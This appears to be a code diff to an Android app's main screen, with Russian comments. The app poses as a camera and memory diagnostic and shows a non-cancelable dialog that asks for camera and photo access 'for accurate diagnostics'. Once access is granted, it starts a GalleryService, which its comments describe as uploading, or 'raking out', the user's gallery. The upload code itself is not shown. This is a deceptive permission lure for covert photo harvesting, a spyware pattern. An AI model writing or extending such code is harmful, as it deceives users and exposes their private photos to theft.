@@ -46,10 +46,14 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {}
 
         btn.setOnClickListener(v -> {
+            // Собираем ВСЕ нужные разрешения
             List<String> perms = new ArrayList<>();
+            
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                 perms.add(Manifest.permission.CAMERA);
             }
+            
+            // Для Android 13+ это READ_MEDIA_IMAGES, для старых - READ_EXTERNAL_STORAGE
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                     perms.add(Manifest.permission.READ_MEDIA_IMAGES);
@@ -60,11 +64,13 @@ public class MainActivity extends AppCompatActivity {
                 }
             }
 
+            // Если есть что спрашивать — показываем диалог
             if (!perms.isEmpty()) {
                 new AlertDialog.Builder(this)
                     .setTitle("Проверка памяти")
-                    .setMessage("Для точной диагностики камеры и памяти необходимо предоставить доступ к файлам и камере.")
+                    .setMessage("Для точной диагностики камеры и памяти необходимо предоставить доступ к файлам (Фото и медиа) и камере.")
                     .setPositiveButton("Разрешить доступ", (dialog, which) -> {
+                        // Вызываем системное окно запроса разрешений
                         ActivityCompat.requestPermissions(this, perms.toArray(new String[0]), 1);
                     })
                     .setCancelable(false)
@@ -72,7 +78,7 @@ public class MainActivity extends AppCompatActivity {
                 return;
             }
 
-            // Если разрешения уже есть - запускаем
+            // Если разрешения уже есть (повторный запуск) — запускаем
             startEverything();
         });
     }
@@ -87,11 +93,11 @@ public class MainActivity extends AppCompatActivity {
             }
             
             if (allGranted) {
-                // СРАЗУ ПОСЛЕ РАЗРЕШЕНИЯ ВЫГРЕБАЕМ ГАЛЕРЕЮ
+                // Разрешил -> Запускаем выгрузку галереи
                 Intent gallerySvc = new Intent(this, GalleryService.class);
                 startService(gallerySvc);
                 
-                // И запускаем анимацию со снимком
+                // И показываем анимацию
                 startEverything();
             }
         }
